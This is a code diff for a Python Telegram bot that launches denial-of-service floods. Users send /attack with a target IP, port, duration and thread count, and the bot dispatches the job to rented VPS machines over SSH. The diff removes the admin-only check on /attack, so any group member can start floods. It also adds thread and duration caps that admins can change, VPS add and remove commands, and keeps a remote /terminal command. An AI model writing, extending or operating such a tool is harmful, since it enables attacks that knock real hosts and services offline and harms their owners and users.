@@ -13,8 +13,8 @@ ADMIN_IDS = [6479495033]  # 🔥 Replace with your Admin IDs
 CONFIG_FILE = "config.json"
 
 # Global variables for configuration
-DEFAULT_TIME_DURATION = 120  # Default attack duration in seconds
-DEFAULT_THREADS = 1200       # Default number of threads
+MAX_THREADS = 2000  # Maximum threads allowed
+MAX_TIME = 240      # Maximum attack duration in seconds
 
 # Dictionary to store temporary data for file uploads
 user_data = {}
@@ -114,10 +114,6 @@ def get_available_vps():
 
 def handle_attack(chat_id, command):
     """Handle the /attack command."""
-    if not is_admin(chat_id):
-        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
-        return
-
     command = command.split()
     if len(command) != 5:
         send_message(chat_id, "⚠️ **Usage:** /attack `<IP>` `<PORT>` `<TIME>` `<THREADS>`")
@@ -133,12 +129,12 @@ def handle_attack(chat_id, command):
         send_message(chat_id, "❌ **Error:** Port, time, and threads must be integers!")
         return
 
-    if time_duration > 240:
-        send_message(chat_id, "🚫 **Maximum duration is 240 seconds!**")
+    if time_duration > MAX_TIME:
+        send_message(chat_id, f"🚫 **Maximum duration is {MAX_TIME} seconds!**")
         return
 
-    if threads > 5000:
-        send_message(chat_id, "🚫 **Maximum threads is 5000!**")
+    if threads > MAX_THREADS:
+        send_message(chat_id, f"🚫 **Maximum threads is {MAX_THREADS}!**")
         return
 
     selected_vps = get_available_vps()
@@ -182,6 +178,10 @@ def execute_attack(vps, target, port, duration, threads, chat_id):
 
 def handle_cvps(chat_id):
     """Handle the /cvps command."""
+    if not is_admin(chat_id):
+        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
+        return
+
     send_message(chat_id, "⏳ **Checking VPS status...**")
     status_message = check_vps_status()
     send_message(chat_id, f"📡 **VPS STATUS:**\n{status_message}")
@@ -201,6 +201,74 @@ def handle_avps(chat_id, command):
     VPS_LIST.append({"ip": ip, "user": user, "password": password, "busy": False})
     save_config()
     send_message(chat_id, f"✅ **VPS `{ip}` added!** ✨")
+
+def handle_rvps(chat_id, command):
+    """Handle the /rvps command to remove a VPS."""
+    if not is_admin(chat_id):
+        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
+        return
+
+    command = command.split()
+    if len(command) != 2:
+        send_message(chat_id, "⚠️ **Usage:** /rvps `<IP>`")
+        return
+
+    ip = command[1]
+    global VPS_LIST
+    initial_length = len(VPS_LIST)
+    VPS_LIST = [vps for vps in VPS_LIST if vps["ip"] != ip]
+
+    if len(VPS_LIST) == initial_length:
+        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
+    else:
+        save_config()
+        send_message(chat_id, f"✅ **VPS `{ip}` removed!** ✨")
+
+def handle_setmaxthreads(chat_id, command):
+    """Handle the /setmaxthreads command."""
+    if not is_admin(chat_id):
+        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
+        return
+
+    command = command.split()
+    if len(command) != 2:
+        send_message(chat_id, "⚠️ **Usage:** /setmaxthreads `<THREADS>`")
+        return
+
+    try:
+        threads = int(command[1])
+        if threads <= 0:
+            send_message(chat_id, "❌ **Threads must be a positive integer!**")
+            return
+
+        global MAX_THREADS
+        MAX_THREADS = threads
+        send_message(chat_id, f"✅ **Maximum threads set to `{threads}`!**")
+    except ValueError:
+        send_message(chat_id, "❌ **Threads must be an integer!**")
+
+def handle_setmaxtime(chat_id, command):
+    """Handle the /setmaxtime command."""
+    if not is_admin(chat_id):
+        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
+        return
+
+    command = command.split()
+    if len(command) != 2:
+        send_message(chat_id, "⚠️ **Usage:** /setmaxtime `<TIME>`")
+        return
+
+    try:
+        time_duration = int(command[1])
+        if time_duration <= 0:
+            send_message(chat_id, "❌ **Time must be a positive integer!**")
+            return
+
+        global MAX_TIME
+        MAX_TIME = time_duration
+        send_message(chat_id, f"✅ **Maximum time set to `{time_duration}` seconds!**")
+    except ValueError:
+        send_message(chat_id, "❌ **Time must be an integer!**")
 
 def handle_upload_start(chat_id):
     """Handle the /upload command."""
@@ -369,40 +437,6 @@ def handle_terminal(chat_id, command):
     except Exception as e:
         send_message(chat_id, f"❌ **Error executing command on `{ip}`:** {str(e)}")
 
-def handle_chmod(chat_id, command):
-    """Handle the /chmod command."""
-    if not is_admin(chat_id):
-        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
-        return
-
-    command = command.split()
-    if len(command) != 2:
-        send_message(chat_id, "⚠️ **Usage:** /chmod `<IP>`")
-        return
-
-    ip = command[1]
-    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
-    if not vps:
-        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
-        return
-
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)
-
-        # Execute the `chmod +x *` command
-        stdin, stdout, stderr = ssh.exec_command("chmod +x *")
-        error = stderr.read().decode().strip()
-        ssh.close()
-
-        if error:
-            send_message(chat_id, f"❌ **Error executing `chmod +x *` on `{ip}`:** {error}")
-        else:
-            send_message(chat_id, f"✅ **Successfully executed `chmod +x *` on `{ip}`.**")
-    except Exception as e:
-        send_message(chat_id, f"❌ **Error executing `chmod +x *` on `{ip}`:** {str(e)}")
-
 def main():
     offset = None
     while True:
@@ -413,28 +447,43 @@ def main():
                 message = update.get("message")
                 if message:
                     chat_id = message["chat"]["id"]
+                    chat_type = message["chat"]["type"]  # Get chat type (private, group, supergroup)
                     text = message.get("text")
+
+                    # Restrict usage in private chats to owner only
+                    if chat_type == "private" and not is_admin(chat_id):
+                        send_message(chat_id, "🚫 **This bot can only be used in groups.**")
+                        continue
 
                     if text and text.startswith("/"):
                         command = text.split()[0]
                         if command == "/attack":
                             handle_attack(chat_id, text)
-                        elif command == "/cvps":
-                            handle_cvps(chat_id)
-                        elif command == "/avps":
-                            handle_avps(chat_id, text)
-                        elif command == "/upload":
-                            handle_upload_start(chat_id)
-                        elif command == "/ls":
-                            handle_ls(chat_id, text)
-                        elif command == "/delete":
-                            handle_delete(chat_id, text)
-                        elif command == "/terminal":
-                            handle_terminal(chat_id, text)
-                        elif command == "/chmod":
-                            handle_chmod(chat_id, text)
+                        elif chat_type == "private" and is_admin(chat_id):
+                            # Allow admin to use all commands in private chats
+                            if command == "/cvps":
+                                handle_cvps(chat_id)
+                            elif command == "/avps":
+                                handle_avps(chat_id, text)
+                            elif command == "/rvps":
+                                handle_rvps(chat_id, text)
+                            elif command == "/setmaxthreads":
+                                handle_setmaxthreads(chat_id, text)
+                            elif command == "/setmaxtime":
+                                handle_setmaxtime(chat_id, text)
+                            elif command == "/upload":
+                                handle_upload_start(chat_id)
+                            elif command == "/ls":
+                                handle_ls(chat_id, text)
+                            elif command == "/delete":
+                                handle_delete(chat_id, text)
+                            elif command == "/terminal":
+                                handle_terminal(chat_id, text)
+                            else:
+                                send_message(chat_id, "❌ **Unknown command. Use `/help` to see available commands.**")
                         else:
-                            send_message(chat_id, "❌ **Unknown command. Use `/help` to see available commands.**")
+                            # Block non-owner usage of other commands in groups
+                            send_message(chat_id, "🚫 **This command is restricted to admins only.**")
                     elif "document" in message:
                         # Handle file uploads
                         file_id = message["document"]["file_id"]
